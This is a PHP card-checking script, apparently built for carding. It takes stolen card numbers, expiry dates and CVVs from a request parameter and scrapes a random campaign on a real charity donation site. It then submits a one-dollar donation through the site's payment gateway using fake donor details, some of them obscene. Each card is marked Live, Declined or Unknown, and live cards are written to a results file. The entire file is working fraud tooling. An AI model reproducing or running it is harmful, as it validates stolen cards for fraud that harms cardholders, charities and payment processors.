<?php
ini_set('max_execution_time', 300);
require __DIR__ . '/vendor/autoload.php';

use \Curl\Curl;

function getString($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}

$asu      = explode('|', $_REQUEST['data']);
$cardnum  = $asu[0];
$month    = $asu[1];
$year     = $asu[2];
$csc      = $asu[3];

(strlen($month) == 1) ? $month  = '0' . $month : $month = $month;
(strlen($year)  ==  2)  ? $year = '20' . $year  : $year = $year;

$curl     = new Curl();
$curl->setCookieFile('cookies/' . md5($cardnum) . 'wirecard.txt');
$curl->setCookieJar('cookies/' . md5($cardnum) . 'wirecard.txt');

$take     = $curl->get('https://takeaction.org.nz/search');
$take     = explode('<div class="searchresult">', $take);
$page     = getString($take[array_rand($take)], '<a href="/page/', '">');
$first    = $curl->get('https://takeaction.org.nz/donate/' . $page);
$second   = $curl->post('https://takeaction.org.nz/donate/' . $page, http_build_query([
  'token' => getString($first, 'name="token" value="', '" />'),
  'paymenttype' => 'pxpay',
  'amount-select-specified' => 'other',
  'amount-select-custom'  => '',
  'amount-radio-specified'  => 'other',
  'amount-radio-custom' => '1',
  'amount'  => '1',
  'title' => 'Mrs',
  'nameforreceipt'  => 'Mrs',
  'receiptfirstname'  => 'Kontol',
  'receiptlastname' => 'KOntol',
  'receiptothername'  => 'Mrs',
  'emailforreceipt' => 'jancok@jancok.memek',
  'phonecontact'  => '+62812938984',
  'mobilecontact' => '',
  'message' => '',
  'donor' => '',
  'sharewithorganiser'  => 'on',
]));

$session      = getString($second, 'process/', '/');

$action       = $curl->get(getString($second, '<a href="', '">'));
$action       = $curl->get(getString($action, '<iframe id="gatewayframe" src="', '"'));

$goblog       = explode('name="ct', $action);
$cardholder   = getString($goblog[1], 'id="', '"');
$number       = getString($goblog[2], 'id="', '"');
$bulan        = getString($goblog[3], 'id="', '"');
$taun         = getString($goblog[4], 'id="', '"');
$cvv          = getString($goblog[5], 'id="', '"');
$gaguna       = getString($goblog[6], 'id="', '"');
$on           = getString($goblog[7], 'id="', '"');

$post         = $curl->post('https://www.ippayments.com.au/access/' . getString($action, 'action="./', '"'), http_build_query([
  'UserSessionId' => getString($action, 'id="UserSessionId" value="', '" />'),
  '__VIEWSTATE'  => getString($action, 'id="__VIEWSTATE" value="', '" />'),
  '__VIEWSTATEGENERATOR'  => getString($action, 'id="__VIEWSTATEGENERATOR" value="', '" />'),
  '__VIEWSTATEENCRYPTED'  =>  '',
  '__EVENTVALIDATION'  => getString($action, 'id="__EVENTVALIDATION" value="', '" />'),
  $cardholder       => 'Aku Ganteng',
  $number           => $cardnum,
  $bulan            =>  $month,
  $taun             =>  $year,
  $cvv              => $csc,
  $gaguna           =>  '',
  $on               =>  'on',
]));

$result       = $curl->get('https://takeaction.org.nz/donate/result/' . $session);
$result       = $curl->post(getString($result, 'action="', '"'), http_build_query([
  'Redirect'  =>  getString($result, 'action="', '"'),
  'SessionId' =>  getString($result, 'SessionId" value = "', '"\'>'),
  'SST'       =>  getString($result, 'SST" value = "', '"\'>'),
]));
$str          = getString($result, '<a href="', '" target="_top">');
$bangsad      = $curl->get($str);

if (strpos($bangsad, 'was successfully received') > 0) {
  $file   = fopen('result/wirecard.txt', 'a');
  fwrite($file, $cardnum . '|' . $month . '|' . $year . '|' . $csc . ' - Live' . PHP_EOL);
  fclose($file);
  echo $cardnum . '|' . $month . '|' . $year . '|' . $csc . ' - Live';
} else if (strpos($bangsad, 'transaction has been unsuccessful') > 0) {
  echo $cardnum . '|' . $month . '|' . $year . '|' . $csc . ' - Declined';
} else {
  echo $cardnum . '|' . $month . '|' . $year . '|' . $csc . ' - Unknown';
}
